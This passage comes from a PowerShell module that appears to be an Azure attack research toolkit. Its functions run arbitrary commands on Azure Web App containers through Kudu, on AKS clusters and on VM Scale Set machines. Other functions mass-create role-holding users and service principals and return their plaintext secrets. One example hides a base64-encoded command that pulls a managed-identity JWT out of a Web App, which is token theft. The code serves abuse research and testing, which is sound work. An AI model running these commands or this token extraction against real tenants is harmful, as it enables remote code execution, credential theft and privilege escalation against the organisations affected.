        on the Web App container and returns either the output or an error.
    .EXAMPLE
        PS C:\> $ARMToken = (Get-AzureRMTokenWithClientCredentials `
                    -ClientID "a6bc98d3-f706-4b94-b562-0720faf8986f" `
                    -ClientSecret "asdf1234" `
                    -TenantName "contoso.onmicrosoft.com").access_token
        
        PS C:\> Invoke-AzureRMWebAppShellCommand -KuduURI "https://mycoolwindowswebapp.scm.azurewebsites.net/api/command" -token $ARMToken -Command "hostname"
        Description
        -----------
        First retrieves an AzureRM-scoped token for a service principal using BARK's Get-AzureRMTokenWithClientCredentials cmdlet,
        then passes that token in the "-token" argument to run the "hostname" command on the Azure App Service Web App container.
    .EXAMPLE
        PS C:\> $PowerShellCommand = '
                $headers=@{"X-IDENTITY-HEADER"=$env:IDENTITY_HEADER}
                $response = Invoke-WebRequest -UseBasicParsing -Uri "$($env:IDENTITY_ENDPOINT)?resource=https://storage.azure.com/&api-version=2019-08-01" -Headers $headers
                $response.RawContent'
        PS C:\> $base64Cmd = [System.Convert]::ToBase64String(
                    [System.Text.Encoding]::Unicode.GetBytes(
                        $PowerShellCommand
                    )
                )
        PS C:\> $Command = "powershell -enc $($base64Cmd)"
        PS C:\> Invoke-AzureRMWebAppShellCommand -KuduURI "https://mycoolwindowswebapp.scm.azurewebsites.net/api/command" -token $ARMToken -Command $Command
        Description
        -----------
        Extracts a JWT for the service principal associated with the Web App via a Managed Identity assignment. First, put the commands for JWT
        request into the $PowerShellCommand variable. Second, base64-encode this command. Third, pass the base64-encoded command into a $Command
        variable, which is the command that will run on the Web App container. Finally, use Invoke-AzureRMWebAppShellCommand to execute the command,
        which will display the JWT for the service principal if successful.
    .LINK
        https://medium.com/p/c3adefccff95
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $False,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $False,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $BasicAuthString,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $KuduURI,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Command
    )

    If ($Token -And $BasicAuthString) {
        Write-Error "You provided a `$Token and a `$BasicAuthString. Please only specify either a `$Token or a `$BasicAuthString, but not both."
        Break
    }

    If ($BasicAuthString) {
        # We have a basic auth string

        $body = @{
            command = $Command
        }
        $Request = Invoke-WebRequest `
            -UseBasicParsing `
            -Uri $KuduURI `
            -Method "POST" `
            -WebSession $session `
            -Headers @{
                "Authorization"="Basic $($BasicAuthString)"
            } `
            -ContentType "application/json" `
            -Body $($body | ConvertTo-Json) 

        If (($Request.Content | ConvertFrom-JSON).Error -eq "") {
            $Output = $Request.Content | ConvertFrom-JSON | Select -Expand Output
        } 

        Else {
            # There was an error when running the command
            $Output = $Request.Content | ConvertFrom-JSON | Select -Expand Error
        }

        $Output

    }

    ElseIf ($Token) {
        # We have a token

        $body = @{
            command = $Command
        }
        $Request = Invoke-WebRequest `
            -UseBasicParsing `
            -Uri $KuduURI `
            -Method "POST" `
            -WebSession $session `
            -Headers @{
                "Authorization"="Bearer $($Token)"
            } `
            -ContentType "application/json" `
            -Body $($body | ConvertTo-Json) 

        If (($Request.Content | ConvertFrom-JSON).Error -eq "") {
            $Output = $Request.Content | ConvertFrom-JSON | Select -Expand Output
        } 

        Else {
            # There was an error when running the command
            $Output = $Request.Content | ConvertFrom-JSON | Select -Expand Error
        }

        $Output
    }

    Else {
        Write-Error "You must provide either a `$Token or `$BasicAuthString to authenticate to the Kudu endpoint"
    }
}

Function Invoke-AzureRMAKSRunCommand {
    <#
    .SYNOPSIS
        Instructs the AKS cluster to execute a command via the /runCommand endpoint

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        When you submit a command to the AKS /runCommand endpoint, the cluster will spin up
        a job execution pod, run the command, and make the output available to you at a
        different URL provided in the headers of the original request

    .PARAMETER TargetAKSId
        The unique identifier of the Azure Kubenertes Service cluster

    .PARAMETER Token
        The AzureRM-scoped JWT for the principal with the ability to run a command on the cluster

    .PARAMETER Command
        The command you want to run on the cluster pod.

    .EXAMPLE
        C:\PS> Invoke-AzureRMAKSRunCommand `
            -Token $ARMToken `
            -TargetAKSId "/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourcegroups/AKS_ResourceGroup/providers/Microsoft.ContainerService/managedClusters/mykubernetescluster" `
            -Command "whoami"

        Description
        -----------
        Attempts to run "whoami" on a job execution pod via the AKS cluster runCommand endpoint

    .LINK
        https://www.netspi.com/blog/technical/cloud-penetration-testing/extract-credentials-from-azure-kubernetes-service/
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetAKSId,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        $Command

    )

    $URL = "https://management.azure.com/$($TargetAKSId)/runCommand?api-version=2022-11-01"

    $Body = @{
        command = $Command
        context = ""
        clusterToken = ""
    }


    $RunCommandRequest = Invoke-RestMethod `
        -Headers @{
            Authorization = "Bearer $($Token)"
        } `
        -Uri $URL `
        -Method POST `
        -Body $($Body | ConvertTo-Json) `
        -ContentType "application/json" `
        -ResponseHeadersVariable "Headers"
    
    [String]$Location = $Headers.Location
    
    $RefreshAttempts = 0
    Do {
        $AsyncJob = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -Uri $Location `
            -Method GET
        $RefreshAttempts++
        Start-Sleep -s 6
    } Until (
        $AsyncJob.properties.provisioningState -Like "Succeeded" -Or $RefreshAttempts -GT 30
    )
    
    $CommandOutput = $AsyncJob.properties.logs

    $CommandOutput
}

Function Get-AllAzureRMVMScaleSets {
    <#
    .SYNOPSIS
        Retrieves all JSON-formatted Azure RM Virtual Machine Scale Set objects under a particular subscription
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves all JSON-formatted Azure RM Virtual Machine Scale Set objects under a particular subscription
    
    .PARAMETER Token
        The AzureRM-scoped JWT for the user with the ability to list Virtual Machine Scale Sets

    .PARAMETER SubscriptionID
        The unique identifier of the subscription you want to list Virtual Machine Scale Sets under
    
    .EXAMPLE
    C:\PS> $VMScaleSets = Get-AllAzureRMVMScaleSets -Token $Token -SubscriptionID "839df4bc-5ac7-441d-bb5d-26d34bca9ea4"
    
    Description
    -----------
    Uses the JWT in the $Token variable to list all Virtual Machine Scale Sets under the subscription with ID starting with "839..." and put them into the $AKSClusters variable
    
    .LINK
        https://www.netspi.com/blog/technical/cloud-penetration-testing/extract-credentials-from-azure-kubernetes-service/
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $SubscriptionID
    )

    # Get all Virtual Machine Scale Sets under a specified subscription
    $URI = "https://management.azure.com/subscriptions/$($SubscriptionID)/providers/Microsoft.Compute/virtualMachineScaleSets?api-version=2022-11-01"

    $Results = $null
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $VMSSObjects += $Results.value
        } else {
            $VMSSObjects += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    $VMSSObjects
}

Function Get-AllAzureRMVMScaleSetsVMs {
    <#
    .SYNOPSIS
        Retrieves all JSON-formatted Virtual Machines under a specified Virtual Machine Scale Set
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves all JSON-formatted Virtual Machines under a specified Virtual Machine Scale Set
    
    .PARAMETER Token
        The AzureRM-scoped JWT for the user with the ability to list Virtual Machines under VM Scale Sets

    .PARAMETER VMScaleSetID
        The unique identifier of the Virtual Machine Scale Set you want to list Virtual Machines under
    
    .EXAMPLE
    C:\PS> $VMScaleSetVMs = Get-AllAzureRMVMScaleSetsVMs `
        -Token $Token `
        -VMScaleSetID "/subscriptions/15cb2d86-343b-49b9-9256-7c2e6975b92d/resourceGroups/MyResourceGroup/providers/Microsoft.Compute/virtualMachineScaleSets/aks-agentpool-81263570-vmss"
    
    Description
    -----------
    Uses the JWT in the $Token variable to list all Virtual Machines under the specified VM Scale Set
    
    .LINK
        https://www.netspi.com/blog/technical/cloud-penetration-testing/extract-credentials-from-azure-kubernetes-service/
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $VMScaleSetID
    )

    # Get all Virtual Machines under the specified VM Scale Set

    $URI = "https://management.azure.com$($VMScaleSetID)/virtualMachines?api-version=2022-11-01"

    $Results = $null
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $VMScaleSetVMObjects += $Results.value
        } else {
            $VMScaleSetVMObjects += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    $VMScaleSetVMObjects
}

Function Invoke-AzureVMScaleSetVMRunCommand {
    <#
    .SYNOPSIS
        Executes a command on the specified VM Scale Set Virtual Machine via its /runCommand endpoint

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Executes a command on the specified VM Scale Set Virtual Machine via its /runCommand endpoint

    .PARAMETER TargetVMScaleSetVMId
        The unique identifier of the Azure Kubenertes Service cluster

    .PARAMETER Token
        The AzureRM-scoped JWT for the principal with the ability to run a command on the VM Scale Set Virtual Machine

    .PARAMETER Command
        The command you want to run on the VMSS Virtual Machine

    .EXAMPLE
        C:\PS> Invoke-AzureVMScaleSetVMRunCommand `
            -Token $ARMToken `
            -TargetVMScaleSetVMId "subscriptions/bf510275-8a83-4932-988f-1b148b83f832/resourceGroups/MC_BHE_SpecterDev_AKS_RG_mykubernetescluster_centralus/providers/Microsoft.Compute/virtualMachineScaleSets/aks-agentpool-81263570-vmss/virtualmachines/2" `
            -Command "whoami"

        Description
        -----------
        Attempts to run "whoami" on a VMSS Virtual Machine

    .LINK
        https://www.netspi.com/blog/technical/cloud-penetration-testing/extract-credentials-from-azure-kubernetes-service/
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetVMScaleSetVMId,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        $Command

    )

    $URL = "https://management.azure.com/$($TargetVMScaleSetVMId)/runCommand?api-version=2022-11-01"
    
    $Body = @{
        commandId = "RunShellScript"
        script = @(
            $Command
        )
    }
    
    $VMSSRunCommandRequest = Invoke-RestMethod `
        -Headers @{
            Authorization = "Bearer $($Token)"
        } `
        -Uri $URL `
        -Method POST `
        -Body $($Body | ConvertTo-Json) `
        -ContentType "application/json" `
        -ResponseHeadersVariable "Headers"
    
    [String]$Location = $Headers.Location
    
    $RefreshAttempts = 0
    Do {
        $AsyncJob = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -Uri $Location `
            -Method GET
        $RefreshAttempts++
        Start-Sleep -s 6
    } Until (
        $AsyncJob.value.code -Like "ProvisioningState/succeeded" -Or $RefreshAttempts -GT 30
    )
    
    $CommandOutput = $AsyncJob.value.message

    $CommandOutput
}

## ################### ##
## BARK Meta Functions ##
## ################### ##

Function New-EntraIDAbuseTestSPs {
    <#
    .SYNOPSIS
        Creates one service prinicipal per active Entra ID admin role and grants each
        service principal the appropriate role. Returns plain text credentials created
        for each service prinicpal.

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies:
            Get-AllEntraRoles
            Get-MSGraphTokenWithClientCredentials
            New-TestAppReg
            New-TestSP
            New-EntraAppSecret

    .DESCRIPTION
        Creates one service prinicipal per active Entra ID admin role and grants each
        service principal the appropriate role. Returns plain text credentials created
        for each service prinicpal.

    .PARAMETER GlobalAdminClientID
        The client ID of a service principal with Global Admin rights.

    .PARAMETER GlobalAdminSecret
        The secret of the service principal with Global Admin rights.

    .PARAMETER TenantName
        The FQDN of the Entra tenant.

    .EXAMPLE
        C:\PS> $EntraIDRoleAbuseTestServicePrincipalCredentials = New-EntraIDAbuseTestSPs `
            -GlobalAdminClientID "b693989d-453f-41af-978b-4b0706a599a5" `
            -GlobalAdminSecret "<secret>" `
            -TenantName "contoso.onmicrosoft.com"

        Description
        -----------
        Creates one service principal per Entra admin role, activates the relevant role assignment
        for each service principal, creates a secret for each service principal. Stores the service principal
        client ID, secret, role ID, role name, and role templates ID into the
        $EntraIDRoleAbuseTestServicePrincipalCredentials variable.

    .EXAMPLE
        C:\PS>  $EntraRoleTemplates = Get-EntraRoleTemplates `
                    -Token $Token

        C:\PS>  $EntraRoleTemplates | %{
                    Enable-EntraRole `
                        -RoleID $_.id `
                        -Token $Token
                }

        C:\PS>  $EntraIDRoleAbuseTestServicePrincipalCredentials = New-EntraIDAbuseTestSPs `
                    -GlobalAdminClientID "b693989d-453f-41af-978b-4b0706a599a5" `
                    -GlobalAdminSecret "<secret>" `
                    -TenantName "contoso.onmicrosoft.com"

        Description
        -----------
        Activate all Entra ID admin roles, and then create one SP per Entra role.
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminClientID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminSecret,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TenantName
    )

    $GlobalAdminToken = Get-MSGraphTokenWithClientCredentials `
        -ClientID       $GlobalAdminClientID `
        -ClientSecret   $GlobalAdminSecret `
        -TenantName     $TenantName

    # Create a unique identifier for this collection of service principals.
    $TestGUID = ([GUID]::NewGuid()).toString().split('-')[0]

    # Create thread-safe collections object to receive output
    $SPCreds = [System.Collections.Concurrent.ConcurrentBag[PSObject]]::New()
    
    # Using the Global Admin token, get the active Entra ID roles
    $EntraIDRoles = Get-AllEntraRoles -Token $GlobalAdminToken.access_token

    # Create one service principal per Entra ID admin role:
    $EntraIDRoles | ForEach-Object -ThrottleLimit 50 -Parallel {

        # Import and later call our functions in a thread-safe way
        # https://github.com/PowerShell/PowerShell/issues/16461#issuecomment-967759037
        If (-Not ${global:New-TestAppReg})                          { $ast = ${using:New-TestAppRegAst};                        ${global:New-TestAppReg} = $ast.GetScriptBlock() }
        If (-Not ${global:New-TestSP})                              { $ast = ${using:New-TestSPAst};                            ${global:New-TestSP} = $ast.GetScriptBlock() }
        If (-Not ${global:New-EntraAppSecret})                      { $ast = ${using:New-EntraAppSecretAst};                    ${global:New-EntraAppSecret} = $ast.GetScriptBlock() }
        If (-Not ${global:Get-MSGraphTokenWithClientCredentials})   { $ast = ${using:Get-MSGraphTokenWithClientCredentialsAst}; ${global:Get-MSGraphTokenWithClientCredentials} = $ast.GetScriptBlock() }

        $ThreadSafeGlobalAdminToken = (& ${global:Get-MSGraphTokenWithClientCredentials} `
            -ClientID ${using:GlobalAdminClientID} `
            -ClientSecret ${using:GlobalAdminSecret} `
            -TenantName ${using:TenantName})

        $ThreadAppRegDisplayName = $(${using:TestGUID} + "-" + $_.displayName)

        # Create the test app reg:
        $ThreadSafeAppReg = (& ${global:New-TestAppReg} `
            -DisplayName $ThreadAppRegDisplayName `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token
        )
        # Wait 1 minute for the app reg to propagate before creating the SP for the app reg
        Start-Sleep 60s

        # Create the test SP:
        $ThreadSafeSP = (& ${global:New-TestSP} `
            -AppId $ThreadSafeAppReg.AppRegAppId `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token
        )
        # Wait 1 minute for the SP to propagate before creating a secret for the app reg.
        Start-Sleep 60s

        # Create a secret for the test app reg:
        $ThreadSafeSecret = (& ${global:New-EntraAppSecret} `
            -AppRegObjectID $ThreadSafeAppReg.AppRegObjectID `
            -Token $ThreadSafeGlobalAdminToken.access_token
        )
        # Wait 1 minute for the secret to propagate before granting the Entra ID admin role to the test app:
        Start-Sleep 60s

        # Grant the Entra ID admin role to the test service principal
        $body = @{
            "@odata.id" =  "https://graph.microsoft.com/v1.0/directoryObjects/$($ThreadSafeSP.SPObjectId)"
        }
        $GrantRole = Invoke-RestMethod -Headers @{Authorization = "Bearer $($ThreadSafeGlobalAdminToken.access_token)" } `
            -Uri "https://graph.microsoft.com/v1.0/directoryRoles/$($_.id)/members/`$ref" `
            -Method POST `
            -Body $($body | ConvertTo-Json) `
            -ContentType 'application/json'

        $SPCred = New-Object PSObject
        $SPCred | Add-Member Noteproperty 'ClientID' $ThreadSafeSecret.AppRegAppId
        $SPCred | Add-Member Noteproperty 'ClientSecret' $ThreadSafeSecret.AppRegSecretValue
        $SPCred | Add-Member Noteproperty 'RoleName' $_.displayName
        $SPCred | Add-Member Noteproperty 'RoleTemplateID' $_.roleTemplateId
        $SPCred | Add-Member Noteproperty 'RoleID' $_.id

        $LocalSPCreds = $using:SPCreds
        $LocalSPCreds.Add($SPCred)

    }

    $SPCreds

}

Function New-EntraIDAbuseTestUsers {
    <#
    .SYNOPSIS
        Creates one user per active Entra ID admin role and grants each
        user the appropriate role. Returns plain text credentials created
        for each user.

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies:
            Get-AllEntraRoles
            Get-MSGraphTokenWithClientCredentials

    .DESCRIPTION
        Creates one user per active Entra ID admin role and grants each
        uyser the appropriate role. Returns plain text credentials created
        for each user.

    .PARAMETER GlobalAdminClientID
        The client ID of a service principal with Global Admin rights.

    .PARAMETER GlobalAdminSecret
        The secret of the service principal with Global Admin rights.

    .PARAMETER TenantName
        The FQDN of the Entra tenant.

    .EXAMPLE
        C:\PS> $EntraIDRoleAbuseTestUserCredentials = New-EntraIDAbuseTestUsers `
            -GlobalAdminClientID "b693989d-453f-41af-978b-4b0706a599a5" `
            -GlobalAdminSecret "<secret>" `
            -TenantName "contoso.onmicrosoft.com"

        Description
        -----------
        Creates one user per Entra admin role, activates the relevant role assignment
        for each user. Stores the user's UPN, password, role ID, role name, and role templates ID into the $EntraIDRoleAbuseTestUserCredentials
        variable.

    .EXAMPLE
        C:\PS>  $EntraRoleTemplates = Get-EntraRoleTemplates `
                    -Token $Token

        C:\PS>  $EntraRoleTemplates | %{
                    Enable-EntraRole `
                        -RoleID $_.id `
                        -Token $Token
                }

        C:\PS>  $EntraIDRoleAbuseTestUserCredentials = New-EntraIDAbuseTestUsers `
                    -GlobalAdminClientID "b693989d-453f-41af-978b-4b0706a599a5" `
                    -GlobalAdminSecret "<secret>" `
                    -TenantName "contoso.onmicrosoft.com"

        Description
        -----------
        Activate all Entra ID admin roles, and then create one user per Entra role.

    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminClientID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminSecret,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TenantName
    )

    $GlobalAdminToken = Get-MSGraphTokenWithClientCredentials `
        -ClientID       $GlobalAdminClientID `
        -ClientSecret   $GlobalAdminSecret `
        -TenantName     $TenantName

    # Create a unique identifier for this collection of users.
    $TestGUID = ([GUID]::NewGuid()).toString().split('-')[0]

    # Create thread-safe collections object to receive output
    $UserCreds = [System.Collections.Concurrent.ConcurrentBag[PSObject]]::New()
    
    # Using the Global Admin token, get the active Entra ID roles
    $EntraIDRoles = Get-AllEntraRoles `
        -Token $GlobalAdminToken.access_token

    # Create one user per Entra ID admin role:
    $EntraIDRoles | ForEach-Object -ThrottleLimit 50 -Parallel {

        $RoleDefinitionID = $_.roleTemplateId

        # Import and later call our functions in a thread-safe way
        # https://github.com/PowerShell/PowerShell/issues/16461#issuecomment-967759037
        If (-Not ${global:Get-MSGraphTokenWithClientCredentials})   { $ast = ${using:Get-MSGraphTokenWithClientCredentialsAst}; ${global:Get-MSGraphTokenWithClientCredentials} = $ast.GetScriptBlock() }

        $ThreadSafeGlobalAdminToken = (& ${global:Get-MSGraphTokenWithClientCredentials} `
            -ClientID ${using:GlobalAdminClientID} `
            -ClientSecret ${using:GlobalAdminSecret} `
            -TenantName ${using:TenantName})

        $UserDisplayName = $(${using:TestGUID} + "-" + $_.displayName.replace(' ',''))
        $UserPassword = (New-GUID).GUID.tostring()
        $UserPrincipalName = "$($UserDisplayName)@$(${using:TenantName})"

        # Create the test user
        $Body = @{
            accountEnabled = "true"
            displayName = $UserDisplayName
            passwordProfile = @{
                forceChangePasswordNextSignIn = "false"
                password = $UserPassword
            }
            mailNickname = $UserDisplayName
            userPrincipalName = $UserPrincipalName
        }
        $CreateUserRequest = Invoke-RestMethod `
            -Headers        @{Authorization = "Bearer $($ThreadSafeGlobalAdminToken.access_token)" } `
            -URI            "https://graph.microsoft.com/v1.0/users/" `
            -Method         POST `
            -Body           $($Body | ConvertTo-JSON) `
            -ContentType    'application/json'

        Start-Sleep 60s

        $body = @{
            "@odata.type" = "#microsoft.graph.unifiedRoleAssignment"
            principalId = $CreateUserRequest.id
            roleDefinitionId = $RoleDefinitionID
            directoryScopeId = "/"
        }

        $GrantRoleRequest = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($ThreadSafeGlobalAdminToken.access_token)"
            } `
            -Uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" `
            -Method POST `
            -Body $($body | ConvertTo-Json) `
            -ContentType 'application/json'

        $UserCred = New-Object PSObject
        $UserCred | Add-Member Noteproperty 'Username' $UserPrincipalName
        $UserCred | Add-Member Noteproperty 'UserPassword' $UserPassword
        $UserCred | Add-Member Noteproperty 'RoleName' $_.displayName
        $UserCred | Add-Member Noteproperty 'RoleTemplateID' $_.roleTemplateId
        $UserCred | Add-Member Noteproperty 'RoleID' $_.id

        $LocalUserCreds = $using:UserCreds
        $LocalUserCreds.Add($UserCred)

    }

    $UserCreds

}

Function New-IntuneAbuseTestUsers {
    <#
    .SYNOPSIS
        Creates one user per Intune role and grants each user the appropriate
        role. Returns plain text credentials created for each user.

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies:
            Get-IntuneRoleDefinitions
            Get-MSGraphTokenWithClientCredentials

    .DESCRIPTION
        Creates one user per Intune role and grants each user the appropriate
        role. Returns plain text credentials created for each user.

    .PARAMETER GlobalAdminClientID
        The client ID of a service principal with Global Admin rights.

    .PARAMETER GlobalAdminSecret
        The secret of the service principal with Global Admin rights.

    .PARAMETER TenantName
        The FQDN of the Entra tenant.

    .EXAMPLE
        C:\PS> $IntuneRoleAbuseTestUserCredentials = New-IntuneAbuseTestUsers `
            -GlobalAdminClientID "b693989d-453f-41af-978b-4b0706a599a5" `
            -GlobalAdminSecret "<secret>" `
            -TenantName "contoso.onmicrosoft.com"

        Description
        -----------
        Creates one user per Intune role, activates the relevant role assignment
        for each user. Stores the user's UPN, password, role ID, role name, and role
        template ID into the $IntuneRoleAbuseTestUserCredentials variable.

    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminClientID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminSecret,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TenantName
    )

    $GlobalAdminToken = Get-MSGraphTokenWithClientCredentials `
        -ClientID       $GlobalAdminClientID `
        -ClientSecret   $GlobalAdminSecret `
        -TenantName     $TenantName

    # Create a unique identifier for this collection of users.
    $TestGUID = ([GUID]::NewGuid()).toString().split('-')[0]

    # Create thread-safe collections object to receive output
    $UserCreds = [System.Collections.Concurrent.ConcurrentBag[PSObject]]::New()
    
    # Get the Intune role definitions
    $IntuneRoleDefinitions = Get-IntuneRoleDefinitions `
        -Token $GlobalAdminToken.access_token

    # Create one user per Intune role:
    $IntuneRoleDefinitions | ForEach-Object -ThrottleLimit 50 -Parallel {

        $RoleDefinitionID = $_.id

        # Import and later call our functions in a thread-safe way
        # https://github.com/PowerShell/PowerShell/issues/16461#issuecomment-967759037
        If (-Not ${global:Get-MSGraphTokenWithClientCredentials})   { $ast = ${using:Get-MSGraphTokenWithClientCredentialsAst}; ${global:Get-MSGraphTokenWithClientCredentials} = $ast.GetScriptBlock() }

        $ThreadSafeGlobalAdminToken = (& ${global:Get-MSGraphTokenWithClientCredentials} `
            -ClientID ${using:GlobalAdminClientID} `
            -ClientSecret ${using:GlobalAdminSecret} `
            -TenantName ${using:TenantName})

        $UserDisplayName = $(${using:TestGUID} + "-" + $_.displayName.replace(' ',''))
        $UserPassword = (New-GUID).GUID.tostring()
        $UserPrincipalName = "$($UserDisplayName)@$(${using:TenantName})"

        # Create the test user
        $Body = @{
            accountEnabled = "true"
            displayName = $UserDisplayName
            passwordProfile = @{
                forceChangePasswordNextSignIn = "false"
                password = $UserPassword
            }
            mailNickname = $UserDisplayName
            userPrincipalName = $UserPrincipalName
        }
        $CreateUserRequest = Invoke-RestMethod `
            -Headers        @{Authorization = "Bearer $($ThreadSafeGlobalAdminToken.access_token)" } `
            -URI            "https://graph.microsoft.com/v1.0/users/" `
            -Method         POST `
            -Body           $($Body | ConvertTo-JSON) `
            -ContentType    'application/json'

        Start-Sleep 60s

        $Body = @{
            id = ""
            description = ""
            displayName = ([GUID]::NewGuid()).toString().split('-')[0]
            members = @(
                "$($CreateUserRequest.id)"
            )
            resourceScopes = @()
            "roleDefinition@odata.bind" = "https://graph.microsoft.com/beta/deviceManagement/roleDefinitions('$($RoleDefinitionID)')"
            scopeType = "allDevicesAndLicensedUsers"
        }
        $Request = Invoke-WebRequest -UseBasicParsing -Uri "https://graph.microsoft.com/beta/deviceManagement/roleAssignments" `
        -Method "POST" `
        -Headers @{
          "Authorization"="Bearer $($ThreadSafeGlobalAdminToken.access_token)"
        } `
        -ContentType "application/json" `
        -Body $($Body | ConvertTo-JSON -Depth 4)

        $UserCred = New-Object PSObject
        $UserCred | Add-Member Noteproperty 'Username' $UserPrincipalName
        $UserCred | Add-Member Noteproperty 'UserPassword' $UserPassword
        $UserCred | Add-Member Noteproperty 'RoleName' $_.displayName
        $UserCred | Add-Member Noteproperty 'RoleID' $_.id

        $LocalUserCreds = $using:UserCreds
        $LocalUserCreds.Add($UserCred)

    }

    $UserCreds

}

Function New-MSGraphAppRoleTestSPs {
    <#
    .SYNOPSIS
        Creates one service prinicipal per MS Graph app role and grants each
        service principal the appropriate role. Returns plain text secret created
        for each service prinicpal.

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies:
            Get-MGAppRoles
            Get-MSGraphTokenWithClientCredentials
            New-TestAppReg
            New-TestSP
            New-EntraAppSecret

    .DESCRIPTION
        Creates one service prinicipal per MS Graph app role and grants each
        service principal the appropriate role. Returns plain text secret created
        for each service prinicpal.

    .PARAMETER GlobalAdminClientID
        The client ID of a service principal with Global Admin rights.

    .PARAMETER GlobalAdminSecret
        The secret of the service principal with Global Admin rights.

    .PARAMETER TenantName
        The FQDN of the Entra tenant.

    .EXAMPLE
        C:\PS> $MSGraphAppRoleAbuseTestServicePrincipalCredentials = New-MSGraphAppRoleTestSPs `
            -GlobalAdminClientID "b693989d-453f-41af-978b-4b0706a599a5" `
            -GlobalAdminSecret "<secret>" `
            -TenantName "contoso.onmicrosoft.com"

        Description
        -----------
        Creates one service principal per MS Graph app role, activates the relevant role assignment
        for each service principal, creates a secret for each service principal. Stores the service principal
        client ID, secret, role ID, role name, and role templates ID into the
        $MSGraphAppRoleAbuseTestServicePrincipalCredentials variable.

    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminClientID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminSecret,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TenantName
        
    )

